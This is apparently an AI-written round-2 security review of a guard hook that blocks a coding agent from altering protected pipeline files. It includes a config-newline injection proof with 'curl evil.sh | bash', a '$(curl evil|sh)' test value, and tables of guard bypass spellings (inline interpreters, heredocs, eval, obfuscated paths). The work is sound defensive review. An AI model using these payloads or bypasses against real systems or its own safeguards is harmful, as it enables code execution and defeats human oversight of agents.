# Review (round 2): task/security-minimal-fix (decision 0042)

## Header

- **Commits reviewed:** `fc4749a..3332723`. The round-2 work is `869ab28..3332723` (review at `64b094e`, then the fix `3332723`); the whole change is `fc4749a..3332723`. Reviewed in a separate clone (`git clone` → `checkout -b review origin/task/security-minimal-fix` → `remote remove origin`), `git log --oneline -4` = `3332723 64b094e 869ab28 fc4749a` as expected.
- **Reviewer context:** independent; I did not have the producer's conversation or its reasoning. Read in this clone: 0042, the round-1 review, the whole diff, `guard_hook.py`, `stage03_analysis.py`, `wrapperlib.py`, `executorlib.py`, every nf-core and non-nf-core wrapper's job body, both CLAUDE.md files, the stage-03 CONTEXT.md, and the test suite.
- **Memory caveat: I was NOT memory-blind.** Glitch memory (MEMORY.md, the auto-memory index, USER.md) loaded into this session and summarises GARS work. **None of it is used as evidence.** Every finding cites a path:line in C or a command I ran with its output.
- **Runtime:** macOS, Python 3.13.2. No 3.6.8 interpreter present; 3.6 compatibility checked by `ast.parse(..., feature_version=(3,6))` and API reading, not execution.
- **Probe tooling (outside C, deleted at end):** `.../gars-fix-review2-scratch/probe.py` (guard hook, `json.dumps` payloads, `CLAUDE_PROJECT_DIR` and `cwd` set inside `gars/`); a `git archive fc4749a` base tree with C's `tests/run_tests.py` copied in; a `git archive 3332723` mutant copy.

## Threat-model verdict

**Honest: YES. Complete for the classes it names: NO.**

Every sentence I checked in 0042's Decision section, the `guard_hook.py` docstring (lines 22-28), `03_custom_analysis/CONTEXT.md` (lines 58-64) and the `3332723` commit message matches what the code does. The round-1 overclaims are gone: the docstring now says "for the SPELLINGS LISTED BELOW ONLY … other spellings of the same writes still pass, and 0042 lists them"; §2's inline/unparseable closures are scoped to listed spellings; §3's record binding is described exactly as implemented; the Test table now labels each row "red at `fc4749a`" or "regression guard". The 14+ residual spellings 0042 lists in "What this does not close" all reproduce as *allowed* in my sweep, and every shape 0042 states as *closed* (§1-4) is now blocked. So the honesty defect that drove round-1's two MAJORs is fixed.

**Where it is incomplete:** §4 is titled "`compute.work_dir` cannot carry shell expansion" and frames itself (0042:29, review finding M-3) as closing "an executing parameter injection" — a config value the shell expands/executes inside the generated job script. `work_dir` is genuinely closed and the fix is sound. But the *sibling* `compute.*` fields (`partition`, `time`, `cpus`, `mem`) come from the **same agent-writable `_config/<assay>.yaml`**, reach the generated `submit.sh` **unvalidated**, and a newline in any of them injects an **executing** line into the script. This is the identical class §4 addresses, and it is neither closed nor listed in "What this does not close." A reader who trusts §4's framing would believe the executing-config-injection class is handled; it is not. That is MAJ-3 below.

## Overall verdict

**APPROVE WITH CHANGES.**

The change is a strict improvement on `fc4749a` and on `869ab28`. No BLOCKER: the 24-shape false-positive sweep of contract-instructed commands is 24/24 allowed. Round-1 MAJ-2 (directory destinations) is **closed**; round-1 MAJ-1 (unstated inline-interpreter residuals) is **resolved by stating them**; all eight round-1 MINORs are fixed. All five CI commands exit 0 (124 tests). The three red-at-`fc4749a` claims I spot-checked, and the WorkspaceFixture stage-03 rows, reproduce as 0042's table says. A new guard test catches a real regression under mutation.

**Required before merge:** close MAJ-3 (validate `compute.partition/time/cpus/mem` for the same characters as `work_dir` — they render into `submit.sh` and a newline executes), **or** state it explicitly in 0042's "What this does not close" and narrow §4's "executing parameter injection" framing to `work_dir` only. Given §4's entire purpose is closing an executing config injection, leaving a same-class sibling open and unstated is the completeness gap; the fix is a few lines.

## Round-1 disposition table

| Round-1 finding | Disposition | Evidence |
|---|---|---|
| **MAJ-1** inline-interpreter residuals (`-Ic`, `--eval`, heredoc, `$GARS_PY`, `eval`, `ksh`, `--wrap`, `awk`, obfuscated) not stated | **Fixed (stated, not closed)** — every one now listed in 0042 "What this does not close" (0042:79); docstring softened to "SPELLINGS LISTED BELOW ONLY". All still pass in my sweep, as documented. | probe "LISTED OPEN" block: all exit 0; 0042:79-80 |
| **MAJ-2** directory destination escapes every target check incl. approval-record deny | **Fixed (closed)** — `destinations()` now adds `dest/basename(src)`; `rel + "/" == prefix` protects the bare dir; `tee` skips flags; `mv` counts sources. | probe "CLAIMED CLOSED": `cp forge into analysis dir`, `mv … out`, `tee -a record`, `chmod -R a+w _system`, `ln -s _system`, `cp evil.py _system/`, `rm -rf _system` → all exit 2 |
| **MIN-1** crash paths exit 1 (RecursionError, deleted cwd) | **Fixed** — whole `main()` in `try`; recursion and deleted-cwd now deny (exit 2). | recursion payload → 2; deleted cwd, no `CLAUDE_PROJECT_DIR` → 2 ("guard failed while checking this call") |
| **MIN-2** reads mentioning a writer verb now denied | **Fixed** — 0042 verbs count in command position only. | `grep chmod _system/guard_hook.py`, `grep -n touch _references/…`, `cp _references/x /tmp/` → all exit 0 |
| **MIN-3** mutations M1/M3 survive | **Fixed** — `test_unjudgeable_calls_name_their_rule` asserts the "could not read this tool call" text (kills M1); `test_denies_directory_destinations_and_flagged_writers` covers chmod/chown/truncate/install (kills M3). | test source lines 2044-2073; my mutation kill below |
| **MIN-4** re-approve after DRAFT reset re-binds record | **Fixed** — `approve` refuses when the record exists and the plan is unstamped; `test_12e`. | stage03_analysis.py:238-242; 12e red at `fc4749a` (ERROR) |
| **MIN-5** `approve` substring match → wrong forgery accusation on prose | **Fixed** — `approve` now uses `re.search(r"^Status: APPROVED", text, re.M)`; `test_12f`. | stage03_analysis.py:231; 12f red at `fc4749a` |
| **MIN-6** unreadable record → `verify` exit 1 (PermissionError) | **Fixed** — `approval_holds` catches `OSError` and returns a refusal. | stage03_analysis.py:200-207 |
| **MIN-7** 0042 Test-table overclaim (`test_allows_after_hardening` called red) | **Fixed** — table rewritten with a Kind column; that row is "regression guard". | 0042:97 |
| **MIN-8** redirection residuals (`>|`, glued, `1>>`, `cd`) unstated | **Fixed** — all now listed in 0042 residuals. | 0042:80 |

Every round-1 finding is resolved. No "neither" outcomes.

## Findings

### BLOCKER
None. 24/24 contract-instructed shapes allowed (sweep below).

### MAJOR

**MAJ-3: `compute.partition/time/cpus/mem` reach the generated `submit.sh` unvalidated; a newline is an executing injection — same class as §4, not closed and not stated.**

- **Claim.** 0042 §4 closes "an executing parameter injection" from the agent-writable `_config/<assay>.yaml` (0042:29, 63-67); "What this does not close" names no other config field.
- **Finding.** `wrapperlib.check_config_common` validates only `work_dir` (wrapperlib.py:221-238). `compute.partition/time/cpus/mem` are in `REQUIRED_KEYS` but checked only for presence and `<REQUIRED>` markers. They flow `cfg` → `executorlib.header_lines` → `_fill` (plain `str.replace`, executorlib.py:239-247) → the `#SBATCH --partition={partition}` directive lines → `wrapperlib.write_submit_sh`, which writes each directive line verbatim into `submit.sh` (wrapperlib.py:312-351). A newline in the value injects a new physical line, which executes when `submit.sh` runs (via `sbatch`, or the `local` backend's `bash "$1"`, executorlib.py:333).
- **Evidence.**
  ```
  cfg = {"compute.partition": "cpu\ncurl evil.sh | bash  # injected", ...}
  executorlib.header_lines(...) →
    '#SBATCH --partition=cpu\ncurl evil.sh | bash  # injected'   # two script lines
  wrapperlib.check_config_common({"compute.partition": "cpu\ncurl evil|bash", ...}, (), fails)
    → fails == []                                                 # not caught
  ```
  These fields come from the same file 0042:64 calls agent-writable; `configure.py apply` writes them, and the file is not guard-protected (it is under `projects/`). By contrast `work_dir`'s check catches `\n`/`\r`.
- **Severity.** MAJOR — it executes. Pre-existing (present at `fc4749a`), but §4's own framing plus the omission from "What this does not close" makes 0042's threat-model statement incomplete for the class it names.
- **Recommended change.** Validate `compute.partition/time/cpus/mem` for the injection set (at minimum CR/LF; ideally the same `$ \` " \\ \n \r` set, since a descriptor could quote them) in `check_config_common`, **or** add a residual line to 0042 and narrow §4 to `work_dir`. (Note: the executor descriptor `directives` lines are also rendered verbatim; `validate()` checks only the `{tokens}`. Lower priority — the descriptor is a workspace-level file — but same mechanism.)

### MINOR
None beyond the round-1 items, all of which are fixed above.

### NOTE

- **N-1: `de.formula` / `de.contrast` are safe.** Both agent-writable, but inserted into `run_de.py` with `{...!r}` (Python repr) and `de.formula` terms are validated against design columns (rnaseq_de.py:76, 226-228). Not a shell line, correctly escaped. No action.
- **N-2: `work_dir` §4 fix is sound and refuses no legitimate path.** Refusing exactly `$ \` " \\ \n \r` is sufficient inside bash double quotes (nothing else escapes that context). `test_07g` good cases — `/gpfs/scratch/user/gars-work/My_Project-1`, `s3://bucket/work/rig`, `/scratch/with space/and.dots@host:1` — all pass; spaces, `@`, `:`, `s3://` accepted. Only the `work_dir` substring is attacker-controlled; the project-name and assay parts are `sanitize_title`/constant.
- **N-3: Crash window between stamp and record behaves as documented.** `approve` stamps first, writes the record second (stage03_analysis.py:296-315); a crash leaves a stamp with no record, which both `approve` and `verify` refuse; recovery is `create`. Matches 0042:69 and CONTEXT.md.
- **N-4: Cross-OS newline claim holds.** `approve` hashes `plan_path.read_bytes()` after `atomic_open(newline=None)` translation; `verify` hashes `read_bytes()`. Both sides see on-disk bytes, so a same-OS approve/verify agrees; a byte-normalising transfer between the two is correctly reported as "changed after approval" (round-1 N-2 reproduced this).
- **N-5: Python 3.6 compat.** `ast.parse(..., feature_version=(3,6))` OK for all three changed helpers; no f-strings or walrus; new stdlib is `getpass.getuser`, `hashlib.sha256`, `datetime.strftime` — all ≤3.6.
- **N-6: Scope is clean.** Diff touches `guard_hook.py`, `stage03_analysis.py`, `wrapperlib.py`, stage-03 `CONTEXT.md`, `0042*.md` + its index row, `tests/run_tests.py`, and the 113→124 counts in `README.md`/`DEVELOPMENT.md` (plus the round-1 review doc). `check_counts.py` clean; runner reports 124. Nothing outside 0042's four sections, the tests, the counts and the decision.
- **N-7: `PLAN.md.approved` mode.** Written at default 0644 (stage03_analysis.py:311, no `mode=`). 0444 would add the filesystem layer to the guard deny; not required, since the guard and directory-dest fix now cover Write/Edit/cp/mv/tee/redirect.

## False-positive sweep (contract-instructed shapes, `CLAUDE_PROJECT_DIR`=`C/gars`, cwd inside it, expect exit 0)

| Command shape (source: CONTEXT.md / CLAUDE.md) | Exit |
|---|---|
| `python3 _system/stage00_register.py assays` / `… --select "01 03"` | 0 / 0 |
| `… create --title "T-ALL cohort" --assays rnaseq_bulk atacseq_bulk` | 0 |
| `… finalize --project projects/p --model "claude-opus-5"` | 0 |
| `sbatch projects/p/00_data/check.sh` | 0 |
| `python3 _system/stage01_samplesheet.py --list-formats` / `… --check … --confirm-exclusions --force` | 0 / 0 |
| `source "$WS/_system/gars-env.sh"` | 0 |
| `python3 "$GARS_WRAPPERS/nfcore-atacseq-wrapper/…py" check …` | 0 |
| `python3 _system/configure.py genomes --assay rnaseq_bulk` | 0 |
| `python3 "${GARS_WRAPPERS:-_system/wrappers}"/nfcore-rnaseq-wrapper/…py prepare …` | 0 |
| `python3 <ws>/_system/executorlib.py submit --workspace projects/p run.sh` | 0 |
| `squeue -j 12345; sacct -j 12345 --format=State` | 0 |
| `python3 _system/stage03_analysis.py create/approve/verify …` | 0 |
| `echo "FAILED …" > projects/p/03_custom_analysis/01_x/STATUS` | 0 |
| `chmod +x projects/p/03_custom_analysis/01_x/scripts/run.sh` | 0 |
| `bash _system/build_projects_index.sh .` | 0 |
| `git pull && git checkout v0.10.0 && git describe --tags` | 0 |
| `ln -s /gpfs/data/raw/S1_R1.fastq.gz projects/p/00_data/rnaseq_bulk/raw/` | 0 |
| `mkdir -p …/results && touch …/results/.keep` | 0 |
| `cat _references/artifact_types.md` | 0 |
| `bash -lc 'source _system/gars-env.sh && "$GARS_PY" …/scripts/run.py'` | 0 |

**Result: 24/24 allowed.** No contract-instructed step is denied.

## Bypass table

### Claimed closed by 0042 (Decision §1-4) — expect blocked (exit 2)

| Shape | Exit 3332723 |
|---|---|
| non-JSON stdin / JSON array / `tool_input` a string | 2 / 2 / 2 |
| deeply nested JSON (RecursionError) | 2 |
| deleted cwd, no `CLAUDE_PROJECT_DIR` | 2 |
| `python3 -c` / `perl -e` / `Rscript -e` / `bash -c "echo >"` naming a protected path | 2 / 2 / 2 / 2 |
| `dd of=` / `ln -sf` / `touch` / `truncate` / `chmod` / `chown` / `install` a protected file | 2 (each) |
| unparseable command naming `_system/` | 2 |
| Write `PLAN.md.approved` / `echo > PLAN.md.approved` | 2 / 2 |
| `cp forge → analysis dir/` / `mv → analysis dir` / `mv record → /tmp` | 2 / 2 / 2 |
| `tee -a …/PLAN.md.approved` | 2 |
| `chmod -R a+w _system` (bare dir) / `ln -s evil _system` / `cp evil.py _system/` / `rm -rf _system` | 2 / 2 / 2 / 2 |

All 26 blocked.

### Listed open in 0042 residuals — expect pass (exit 0), as documented

| Shape | Exit 3332723 |
|---|---|
| `python3 -Ic` / `-Bc` (grouped flags) | 0 / 0 |
| `"$GARS_PY" -c` (variable interpreter) / `py -c` (Windows launcher) | 0 / 0 |
| `node --eval` (long flag) | 0 |
| `python3 - <<'EOF'` (heredoc) / `echo code \| python3` (stdin) | 0 / 0 |
| `eval '… > _system'` / `ksh -c` / `sbatch --wrap=` / `awk '… > "_system"'` | 0 / 0 / 0 / 0 |
| `sudo chmod` / `xargs touch` (prefixed verbs) | 0 / 0 |
| `echo x>_system/y` (glued) / `>|` / `cd _system && echo >` | 0 / 0 / 0 |
| `python3 -c "open('_sys'+'tem/x','w')"` (obfuscated) | 0 |

All pass, each named in 0042:79-80. Not findings (rubric point 3).

## Red-at-`fc4749a` proofs (C's `tests/run_tests.py` over a `git archive fc4749a` tree)

| Test | At `fc4749a` |
|---|---|
| `GuardHookTests.test_unreadable_call_is_refused` | FAIL |
| `GuardHookTests.test_denies_writes_the_scan_could_not_see` | FAIL (`0 != 2` on `python3 -c … _system`) |
| `ExecutorSeamTests.test_07g_work_dir_cannot_carry_shell_expansion` | FAIL (`fails == []` for `/scratch/$(curl evil\|sh)`) |
| `WorkspaceFixture` (whole class) | 12c FAIL, 12d ERROR, 12e ERROR, 12f FAIL — exactly the 0042 table |

## Mutation proof (a `git archive 3332723` copy, mutated then deleted)

| Mutation | Test | Result |
|---|---|---|
| none | `test_denies_directory_destinations_and_flagged_writers` | OK |
| drop `or rel + "/" == prefix` (the MAJ-2 bare-dir fix) | same test | **FAIL** (`0 != 2` on `chmod -R a+w _system`) |

The new guard test catches the regression it was written for.

## Commands and exit codes

| Command (in C unless noted) | Exit | Output |
|---|---|---|
| `git clone …` / `checkout -b review` / `remote remove origin` / `log --oneline -4` | 0 | `3332723 64b094e 869ab28 fc4749a` |
| `python3 tests/run_tests.py` | 0 | Ran 124, OK (skipped=9) |
| `python3 tests/check_contracts.py` | 0 | 14 contracts clean |
| `python3 tests/check_counts.py` | 0 | enforced=3, clean |
| `python3 evals/test_harness.py` | 0 | Ran 44, OK |
| `python3 evals/check_results.py --controls --lexicon` | 0 | lexicon 42/24/21/69, graded=1, clean |
| probe.py (FP + bypass, json.dumps payloads) | 0 | tables above |
| `header_lines` newline-partition render + `check_config_common` | 0 | injection reproduced, not caught |
| `ast.parse(feature_version=(3,6))` × 3 helpers | 0 | all OK |
| base-tree red-at-`fc4749a` runs | (test FAIL) | tables above |
| mutant directory-dest kill | (test FAIL) | table above |

## Summary counts

BLOCKER 0 · MAJOR 1 (MAJ-3) · MINOR 0 · NOTE 7
